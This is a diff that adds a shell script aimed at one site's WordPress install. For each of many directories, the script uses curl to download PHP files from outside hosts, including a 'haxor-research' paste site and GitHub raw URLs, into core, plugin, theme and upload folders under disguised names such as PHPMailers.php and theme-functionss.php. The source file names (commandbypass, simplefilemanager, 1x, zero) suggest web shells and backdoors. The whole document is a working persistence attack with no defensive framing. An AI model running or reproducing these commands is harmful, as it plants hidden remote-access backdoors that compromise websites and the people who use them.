@@ -1,0 +1,16 @@
+base="/var/www/vhosts/raizers.com/httpdocs"; \
+[ -d "$base/wp-admin/css/colors/blue" ] && curl -s -o "$base/wp-admin/css/colors/blue/index.php" https://oldbreak.com/commandbypass.txt; \
+[ -d "$base/wp-includes/PHPMailer" ] && curl -s -o "$base/wp-includes/PHPMailer/PHPMailers.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/sample.php; \
+[ -d "$base/wp-content/languages" ] && curl -s -o "$base/wp-content/languages/index.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/simplefilemanager.php; \
+[ -d "$base/wp-content/plugins/elementor/includes/widgets/traits" ] && curl -s -o "$base/wp-content/plugins/elementor/includes/widgets/traits/buttons.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/mav.php; \
+[ -d "$base/wp-includes/pomo" ] && curl -s -o "$base/wp-includes/pomo/moss.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/1x.php; \
+[ -d "$base/wp-content/uploads/2023/03" ] && curl -s -o "$base/wp-content/uploads/2023/03/03s.php" https://paste.haxor-research.com/raw/4b78adf9; \
+[ -d "$base/wp-content/plugins/wps-hide-login/vendor/composer" ] && curl -s -o "$base/wp-content/plugins/wps-hide-login/vendor/composer/installeds.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/zero.php; \
+[ -d "$base/wp-includes/ID3" ] && curl -s -o "$base/wp-includes/ID3/getid4s.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/sample.php; \
+[ -d "$base/wp-includes/js/dist/vendor" ] && curl -s -o "$base/wp-includes/js/dist/vendor/reacts.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/1x.php; \
+[ -d "$base/wp-admin/user" ] && curl -s -o "$base/wp-admin/user/freedoms.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/2x.php; \
+[ -d "$base/wp-includes/sitemaps" ] && curl -s -o "$base/wp-includes/sitemaps/class-wps.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/zero.php; \
+# --- TAMBAHAN BARU (folder berbeda) --- \
+[ -d "$base/wp-content/uploads" ] && curl -s -o "$base/wp-content/uploads/license-cores.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/update-checker.php; \
+[ -d "$base/wp-content/themes/twentytwentythree" ] && curl -s -o "$base/wp-content/themes/twentytwentythree/theme-functionss.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/database-update.php; \
+[ -d "$base/wp-includes/customize" ] && curl -s -o "$base/wp-includes/customize/class-wp-customize-loaderss.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/database-update.php
